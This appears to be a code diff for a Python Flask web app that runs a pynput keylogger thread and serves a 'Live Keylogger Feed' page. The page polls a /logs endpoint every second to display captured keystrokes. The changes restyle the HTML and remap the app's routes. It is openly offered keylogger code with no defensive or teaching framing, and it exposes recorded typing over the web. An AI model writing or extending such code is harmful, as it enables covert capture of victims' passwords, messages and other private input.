@@ -1,7 +1,7 @@
 from flask import Flask, render_template_string, jsonify
 from pynput import keyboard
-import os
 from threading import Thread
+import os
 from werkzeug.middleware.dispatcher import DispatcherMiddleware
 from werkzeug.wrappers import Response
 
@@ -24,7 +24,32 @@ keylogger_thread.start()
 
 app = Flask(__name__)
 
-HTML_PAGE = """<!DOCTYPE html><html><head><title>Logs</title></head><body><h1>Keylogs</h1><pre id='log'>Loading...</pre><script>async function fetchLogs(){const res=await fetch('/api/logs');const data=await res.json();document.getElementById('log').textContent=data.data;}setInterval(fetchLogs,1000);fetchLogs();</script></body></html>"""
+HTML_PAGE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Keylogger Logs</title>
+    <style>
+        body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
+        #log { white-space: pre-wrap; background: #000; padding: 1rem; border: 1px solid #0f0; }
+    </style>
+</head>
+<body>
+    <h1>Live Keylogger Feed</h1>
+    <div id="log">Loading...</div>
+    <script>
+        async function fetchLogs() {
+            const res = await fetch("/logs");
+            const data = await res.json();
+            document.getElementById("log").textContent = data.data;
+        }
+        setInterval(fetchLogs, 1000);
+        fetchLogs();
+    </script>
+</body>
+</html>
+"""
 
 @app.route("/")
 def index():
@@ -38,5 +63,5 @@ def logs():
 
 def handler(environ, start_response):
     return DispatcherMiddleware(Response('Not Found', status=404), {
-        '/api': app
+        '/': app
     })(environ, start_response)
